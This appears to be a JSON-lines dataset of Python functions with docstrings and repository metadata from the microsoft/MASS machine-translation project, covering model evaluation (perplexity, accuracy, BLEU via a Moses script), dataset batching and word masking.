{"docstring": "\"\"\"\nEvaluate perplexity and next word prediction accuracy.\n\"\"\"\n", "func_signal": "def evaluate_mt(self, scores, data_set, lang1, lang2, eval_bleu):\n", "code": "params = self.params\nassert data_set in ['valid', 'test']\nassert lang1 in params.langs\nassert lang2 in params.langs\n\nself.encoder.eval()\nself.decoder.eval()\nencoder = self.encoder.module if params.multi_gpu else self.encoder\ndecoder = self.decoder.module if params.multi_gpu else self.decoder\n\nparams = params\nlang1_id = params.lang2id[lang1]\nlang2_id = params.lang2id[lang2]\n\nn_words = 0\nxe_loss = 0\nn_valid = 0\n\n# store hypothesis to compute BLEU score\nif eval_bleu:\n    hypothesis = []\n\nfor batch in self.get_iterator(data_set, lang1, lang2):\n\n    # generate batch\n    (x1, len1), (x2, len2) = batch\n    langs1 = x1.clone().fill_(lang1_id)\n    langs2 = x2.clone().fill_(lang2_id)\n\n    # target words to predict\n    alen = torch.arange(len2.max(), dtype=torch.long, device=len2.device)\n    pred_mask = alen[:, None] < len2[None] - 1  # do not predict anything given the last target word\n    y = x2[1:].masked_select(pred_mask[:-1])\n    assert len(y) == (len2 - 1).sum().item()\n\n    # cuda\n    x1, len1, langs1, x2, len2, langs2, y = to_cuda(x1, len1, langs1, x2, len2, langs2, y)\n\n    # encode source sentence\n    enc1 = encoder('fwd', x=x1, lengths=len1, langs=langs1, causal=False)\n    enc1 = enc1.transpose(0, 1)\n\n    # decode target sentence\n    dec2 = decoder('fwd', x=x2, lengths=len2, langs=langs2, causal=True, src_enc=enc1, src_len=len1)\n\n    # loss\n    word_scores, loss = decoder('predict', tensor=dec2, pred_mask=pred_mask, y=y, get_scores=True)\n\n    # update stats\n    n_words += y.size(0)\n    xe_loss += loss.item() * len(y)\n    n_valid += (word_scores.max(1)[1] == y).sum().item()\n\n    # generate translation - translate / convert to text\n    if eval_bleu:\n        max_len = int(1.5 * len1.max().item() + 10)\n        if params.beam_size == 1:\n            generated, lengths = decoder.generate(enc1, len1, lang2_id, max_len=max_len)\n        else:\n            generated, lengths = decoder.generate_beam(\n                enc1, len1, lang2_id, beam_size=params.beam_size,\n                length_penalty=params.length_penalty,\n                early_stopping=params.early_stopping,\n                max_len=max_len\n            )\n        hypothesis.extend(convert_to_text(generated, lengths, self.dico, params))\n\n# compute perplexity and prediction accuracy\nscores['%s_%s-%s_mt_ppl' % (data_set, lang1, lang2)] = np.exp(xe_loss / n_words)\nscores['%s_%s-%s_mt_acc' % (data_set, lang1, lang2)] = 100. * n_valid / n_words\n\n# compute BLEU\nif eval_bleu:\n\n    # hypothesis / reference paths\n    hyp_name = 'hyp{0}.{1}-{2}.{3}.txt'.format(scores['epoch'], lang1, lang2, data_set)\n    hyp_path = os.path.join(params.hyp_path, hyp_name)\n    ref_path = params.ref_paths[(lang1, lang2, data_set)]\n\n    # export sentences to hypothesis file / restore BPE segmentation\n    with open(hyp_path, 'w', encoding='utf-8') as f:\n        f.write('\\n'.join(hypothesis) + '\\n')\n    restore_segmentation(hyp_path)\n\n    # evaluate BLEU score\n    bleu = eval_moses_bleu(ref_path, hyp_path)\n    logger.info(\"BLEU %s %s : %f\" % (hyp_path, ref_path, bleu))\n    scores['%s_%s-%s_mt_bleu' % (data_set, lang1, lang2)] = bleu", "path": "MASS/MASS-unsupNMT/src/evaluation/evaluator.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
{"docstring": "\"\"\"\nReturn a sentences iterator, given the associated sentence batches.\n\"\"\"\n", "func_signal": "def get_batches_iterator(self, batches, return_indices):\n", "code": "assert type(return_indices) is bool\n\nfor sentence_ids in batches:\n    if 0 < self.max_batch_size < len(sentence_ids):\n        np.random.shuffle(sentence_ids)\n        sentence_ids = sentence_ids[:self.max_batch_size]\n    pos = self.pos[sentence_ids]\n    sent = [self.sent[a:b] for a, b in pos]\n    sent = self.batch_sentences(sent)\n    yield (sent, sentence_ids) if return_indices else sent", "path": "MASS/MASS-unsupNMT/src/data/dataset.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
{"docstring": "\"\"\"\nRun all evaluations.\n\"\"\"\n", "func_signal": "def run_all_evals(self, trainer):\n", "code": "params = self.params\nscores = OrderedDict({'epoch': trainer.epoch})\n\nwith torch.no_grad():\n\n    for data_set in ['valid', 'test']:\n\n        # causal prediction task (evaluate perplexity and accuracy)\n        for lang1, lang2 in params.clm_steps:\n            self.evaluate_clm(scores, data_set, lang1, lang2)\n\n        # prediction task (evaluate perplexity and accuracy)\n        for lang1, lang2 in params.mlm_steps:\n            self.evaluate_mlm(scores, data_set, lang1, lang2)\n        \n        for lang in params.mass_steps:\n            self.evaluate_mass(scores, data_set, lang)\n        \n        mass_steps = []\n        for lang1 in params.mass_steps:\n            for lang2 in params.mass_steps:\n                if lang1 != lang2:\n                    mass_steps.append((lang1, lang2))\n        # machine translation task (evaluate perplexity and accuracy)\n        for lang1, lang2 in set(params.mt_steps + [(l2, l3) for _, l2, l3 in params.bt_steps] + mass_steps):\n            eval_bleu = params.eval_bleu and params.is_master\n            self.evaluate_mt(scores, data_set, lang1, lang2, eval_bleu)\n\n        # report average metrics per language\n        _clm_mono = [l1 for (l1, l2) in params.clm_steps if l2 is None]\n        if len(_clm_mono) > 0:\n            scores['%s_clm_ppl' % data_set] = np.mean([scores['%s_%s_clm_ppl' % (data_set, lang)] for lang in _clm_mono])\n            scores['%s_clm_acc' % data_set] = np.mean([scores['%s_%s_clm_acc' % (data_set, lang)] for lang in _clm_mono])\n        _mlm_mono = [l1 for (l1, l2) in params.mlm_steps if l2 is None]\n        if len(_mlm_mono) > 0:\n            scores['%s_mlm_ppl' % data_set] = np.mean([scores['%s_%s_mlm_ppl' % (data_set, lang)] for lang in _mlm_mono])\n            scores['%s_mlm_acc' % data_set] = np.mean([scores['%s_%s_mlm_acc' % (data_set, lang)] for lang in _mlm_mono])\n\nreturn scores", "path": "MASS/MASS-unsupNMT/src/evaluation/evaluator.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
{"docstring": "\"\"\"\nOnly select a subset of the dataset.\n\"\"\"\n", "func_signal": "def select_data(self, a, b):\n", "code": "if not (0 <= a < b <= self.n_batches):\n    logger.warning(\"Invalid split values: %i %i - %i\" % (a, b, self.n_batches))\n    return\nassert 0 <= a < b <= self.n_batches\nlogger.info(\"Selecting batches from %i to %i ...\" % (a, b))\n\n# sub-select\nself.data = self.data[a * self.bptt:b * self.bptt]\nself.n_batches = b - a\nself.n_sentences = (self.data == self.eos).sum().item()", "path": "MASS/MASS-unsupNMT/src/data/dataset.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
{"docstring": "\"\"\"\nGiven a file of hypothesis and reference files,\nevaluate the BLEU score using Moses scripts.\n\"\"\"\n", "func_signal": "def eval_moses_bleu(ref, hyp):\n", "code": "assert os.path.isfile(hyp)\nassert os.path.isfile(ref) or os.path.isfile(ref + '0')\nassert os.path.isfile(BLEU_SCRIPT_PATH)\ncommand = BLEU_SCRIPT_PATH + ' %s < %s'\np = subprocess.Popen(command % (ref, hyp), stdout=subprocess.PIPE, shell=True)\nresult = p.communicate()[0].decode(\"utf-8\")\nif result.startswith('BLEU'):\n    return float(result[7:result.index(',')])\nelse:\n    logger.warning('Impossible to parse BLEU score! \"%s\"' % result)\n    return -1", "path": "MASS/MASS-unsupNMT/src/evaluation/evaluator.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
{"docstring": "\"\"\"\nDecide of random words to mask out.\nWe specify the random generator to ensure that the test is the same at each epoch.\n\"\"\"\n", "func_signal": "def mask_out(self, x, lengths, rng):\n", "code": "params = self.params\nslen, bs = x.size()\n\n# words to predict - be sure there is at least one word per sentence\nto_predict = rng.rand(slen, bs) <= params.word_pred\nto_predict[0] = 0\nfor i in range(bs):\n    to_predict[lengths[i] - 1:, i] = 0\n    if not np.any(to_predict[:lengths[i] - 1, i]):\n        v = rng.randint(1, lengths[i] - 1)\n        to_predict[v, i] = 1\npred_mask = torch.from_numpy(to_predict.astype(np.uint8))\n\n# generate possible targets / update x input\n_x_real = x[pred_mask]\n_x_mask = _x_real.clone().fill_(params.mask_index)\nx = x.masked_scatter(pred_mask, _x_mask)\n\nassert 0 <= x.min() <= x.max() < params.n_words\nassert x.size() == (slen, bs)\nassert pred_mask.size() == (slen, bs)\n\nreturn x, _x_real, pred_mask", "path": "MASS/MASS-unsupNMT/src/evaluation/evaluator.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
{"docstring": "\"\"\"\nBuild encoder / decoder evaluator.\n\"\"\"\n", "func_signal": "def __init__(self, trainer, data, params):\n", "code": "super().__init__(trainer, data, params)\nself.encoder = trainer.encoder\nself.decoder = trainer.decoder", "path": "MASS/MASS-unsupNMT/src/evaluation/evaluator.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
{"docstring": "\"\"\"\nReturn a sentences iterator.\n\"\"\"\n", "func_signal": "def get_iterator(self, shuffle, subsample=1):\n", "code": "indexes = (np.random.permutation if shuffle else range)(self.n_batches // subsample)\nfor i in indexes:\n    a = self.bptt * i\n    b = self.bptt * (i + 1)\n    yield torch.from_numpy(self.data[a:b].astype(np.int64)), self.lengths", "path": "MASS/MASS-unsupNMT/src/data/dataset.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
